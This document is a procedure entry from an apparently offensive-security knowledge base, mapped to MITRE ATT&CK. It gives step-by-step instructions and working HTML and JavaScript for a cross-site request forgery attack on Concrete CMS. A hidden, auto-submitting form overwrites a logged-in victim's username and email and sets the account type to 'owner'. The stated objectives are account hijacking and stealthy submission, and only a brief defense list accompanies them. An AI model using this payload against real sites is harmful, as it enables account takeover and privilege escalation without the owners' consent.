---
id: p-create-csrf-form-concrete
tags:
  - csrf
  - exploit
  - html
  - concrete-cms
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:33:06.327Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create Malicious HTML Form for Concrete CMS CSRF

## Summary

This procedure constructs a malicious HTML page with a hidden form that auto-submits forged POST data to the Concrete CMS profile endpoint, enabling unauthorized changes to user details.

## Description

The form targets the vulnerable `/profile/preferences/-/save/` endpoint, populating fields such as `uName` (username), `uEmail` (email), and `uAccountType` (set to 'owner' for elevated privileges). JavaScript ensures automatic submission upon page load, exploiting the absence of CSRF tokens to overwrite victim account information when loaded in an authenticated session.

## Requirements

1. Text editor (e.g., VS Code) for HTML creation
2. Knowledge of the target endpoint URL and required form fields
3. Local web server or hosting capability to serve the HTML

## Defense

Defensive measures and detection strategies:

- Enforce same-site cookie policies (e.g., Strict SameSite)
- Log and alert on rapid profile changes
- Educate users on phishing risks

## Objectives

1. Forge profile update data to hijack account
2. Ensure stealthy auto-submission
3. Test form efficacy in an authenticated context

## Instructions

### Step 1: Draft the HTML Form

**Context**: Create the basic structure of the HTML with hidden inputs for the forged data.

Open a text editor and write:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf-form" action="https://target.com/profile/preferences/-/save/" method="POST">
<input type="hidden" name="uName" value="attacker_username">
<input type="hidden" name="uEmail" value="attacker@email.com">
<input type="hidden" name="uAccountType" value="owner">
<!-- Add other required fields as needed -->
</form>
</body>
</html>
```

**Expected Output**: Valid HTML file ready for scripting.

### Step 2: Add Auto-Submission Script

**Context**: Use JavaScript to submit the form immediately on load, mimicking user interaction.

Append to the HTML body:

```html
<script>
document.getElementById('csrf-form').submit();
</script>
```

**Expected Output**: Page that triggers POST on load.

### Step 3: Test the Form

**Context**: Serve locally and test in an authenticated browser to verify update.

Host the file (e.g., via Python's `http.server`) and load while logged into the target site.

**Expected Output**: Profile updated to forged values.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[exploit]]
- [[concrete-cms]]
